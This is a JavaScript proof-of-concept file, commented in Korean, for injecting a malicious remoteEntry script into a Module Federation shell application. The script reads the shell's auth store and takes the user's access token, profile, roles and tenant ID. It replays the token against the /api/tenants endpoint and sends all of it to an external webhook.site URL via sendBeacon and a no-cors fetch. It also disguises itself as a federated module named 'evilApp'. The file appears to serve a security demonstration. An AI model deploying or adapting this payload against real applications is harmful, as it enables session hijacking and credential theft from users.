// ============================================================
// Module Federation remoteEntry Injection PoC
//
// Shell의 DynamicRemoteLoader가 <script src>로 이 파일을 로드하면
// Shell 페이지와 동일한 origin에서 실행됩니다.
// → window.__NEXUS_AUTH_STORE__ 직접 접근 가능
// ============================================================

(function() {
  // ============================================
  // CONFIG — 수신 서버 URL (본인 PC에서 receiver 실행)
  // 수신 안 할 거면 빈 문자열로 두세요 — 화면 표시만 됩니다
  // ============================================
  var EXFIL_URL = 'https://webhook.site/69edad89-6fa7-4706-94cb-4b0a0094b218';

  // 토큰 탈취
  var store = window.__NEXUS_AUTH_STORE__;
  if (!store) {
    console.log('[PoC] __NEXUS_AUTH_STORE__ not found');
    return;
  }

  var state = store.getState();
  var data = {
    vector: 'remoteEntry-injection',
    timestamp: new Date().toISOString(),
    token: state.accessToken,
    username: state.profile ? state.profile.preferred_username : null,
    email: state.profile ? state.profile.email : null,
    roles: state.roles,
    groups: state.groups,
    tenantId: state.tenantId,
    isAuthenticated: state.isAuthenticated,
    url: window.location.href
  };

  // 콘솔 출력
  console.log('%c[PoC] TOKEN STOLEN via remoteEntry injection', 'color: red; font-size: 16px; font-weight: bold;');
  console.log('%cUser: ' + data.username, 'color: cyan; font-size: 14px;');
  console.log('%cRoles: ' + JSON.stringify(data.roles), 'color: cyan; font-size: 14px;');
  console.log('%cToken: ' + (data.token ? data.token.substring(0, 50) + '...' : 'null'), 'color: yellow; font-size: 12px;');
  console.log('[PoC] Full data:', data);

  // Shell 화면에 결과 표시 (시각적 증거)
  var overlay = document.createElement('div');
  overlay.id = 'poc-overlay';
  overlay.style.cssText = 'position:fixed;top:20px;right:20px;z-index:99999;background:#1a1a2e;color:#eee;border:2px solid #e94560;border-radius:12px;padding:20px;font-family:monospace;font-size:12px;max-width:500px;box-shadow:0 8px 32px rgba(0,0,0,0.5);line-height:1.6;';
  overlay.innerHTML =
    '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">' +
      '<span style="color:#e94560;font-size:16px;font-weight:bold;">TOKEN STOLEN</span>' +
      '<button onclick="this.parentElement.parentElement.remove()" style="background:none;border:none;color:#888;cursor:pointer;font-size:18px;">✕</button>' +
    '</div>' +
    '<div style="color:#888;margin-bottom:8px;">via remoteEntry script injection</div>' +
    '<div style="background:#16213e;border-radius:8px;padding:12px;margin-top:8px;">' +
      '<div><span style="color:#888;">user:</span> <span style="color:#0ff;">' + (data.username || 'null') + '</span></div>' +
      '<div><span style="color:#888;">email:</span> <span style="color:#0ff;">' + (data.email || 'null') + '</span></div>' +
      '<div><span style="color:#888;">roles:</span> <span style="color:#0ff;">' + JSON.stringify(data.roles) + '</span></div>' +
      '<div><span style="color:#888;">groups:</span> <span style="color:#0ff;">' + JSON.stringify(data.groups) + '</span></div>' +
      '<div><span style="color:#888;">tenant:</span> <span style="color:#0ff;">' + data.tenantId + '</span></div>' +
      '<div style="margin-top:8px;"><span style="color:#888;">token:</span></div>' +
      '<div style="color:#e94560;word-break:break-all;font-size:10px;max-height:60px;overflow:auto;">' + (data.token ? data.token.substring(0, 80) + '...' : 'null') + '</div>' +
    '</div>' +
    '<div style="color:#888;font-size:10px;margin-top:8px;">' + data.timestamp + '</div>' +
    (EXFIL_URL ? '<div style="color:#4ecca3;margin-top:8px;">Sent to: ' + EXFIL_URL + '</div>' : '<div style="color:#888;margin-top:8px;">EXFIL_URL not set (console only)</div>');

  document.body.appendChild(overlay);

  // 탈취한 토큰으로 API 호출 테스트
  if (data.token) {
    fetch('/api/tenants', {
      headers: {
        'Authorization': 'Bearer ' + data.token,
        'X-Tenant-ID': data.tenantId || 'default'
      }
    })
    .then(function(r) { return r.json(); })
    .then(function(apiData) {
      console.log('[PoC] API call with stolen token:', apiData);
      data.apiResult = { status: 200, data: apiData };

      var apiDiv = document.createElement('div');
      apiDiv.style.cssText = 'background:#16213e;border-radius:8px;padding:12px;margin-top:8px;';
      apiDiv.innerHTML = '<div style="color:#e94560;font-weight:bold;">API call with stolen token:</div>' +
        '<div style="color:#0ff;font-size:10px;max-height:80px;overflow:auto;">' + JSON.stringify(apiData, null, 2) + '</div>';
      overlay.appendChild(apiDiv);

      // 외부 전송 (API 결과 포함)
      sendToExfil(data);
    })
    .catch(function(e) {
      console.log('[PoC] API call failed:', e.message);
      sendToExfil(data);
    });
  } else {
    sendToExfil(data);
  }

  function sendToExfil(payload) {
    if (!EXFIL_URL) return;

    // sendBeacon — CORS preflight 없이 전송 (text/plain)
    try {
      var sent = navigator.sendBeacon(EXFIL_URL, JSON.stringify(payload));
      console.log('[PoC] sendBeacon: ' + (sent ? 'OK' : 'FAILED'));
    } catch (e) {
      console.log('[PoC] sendBeacon error: ' + e.message);
    }

    // fetch no-cors 백업
    try {
      fetch(EXFIL_URL, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(payload)
      });
      console.log('[PoC] fetch no-cors sent');
    } catch (e) {}
  }

  // MF 컨테이너 위장 (DynamicRemoteLoader 에러 방지)
  var remoteName = 'evilApp';
  window[remoteName] = {
    get: function() {
      return function() {
        return {
          __esModule: true,
          default: function() { return null; }
        };
      };
    },
    init: function() { return Promise.resolve(); }
  };
})();
